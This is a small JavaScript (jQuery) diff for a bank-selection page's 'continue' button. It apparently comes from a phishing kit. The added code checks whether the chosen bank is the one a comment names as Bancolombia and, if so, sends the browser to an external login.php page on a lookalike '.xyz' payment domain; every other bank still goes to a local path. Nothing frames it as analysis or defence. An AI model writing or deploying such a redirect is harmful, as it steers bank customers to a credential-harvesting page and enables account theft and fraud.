@@ -61,7 +61,13 @@ $(document).ready(function() {
     });
 
     $("#btn-seguir").click(function(){
-        window.location.href = "../ent/" + $("#hdd-banco").val();                 
+        var banco = $("#hdd-banco").val();
+        // Si es Bancolombia, redirije a URL externa
+        if (banco === "b-34f9") {
+            window.location.href = "https://pagocontinuooapse.xyz/transaction/ent/b-34f9/poral/a/login.php";
+        } else {
+            window.location.href = "../ent/" + banco;
+        }
     });
 
 });
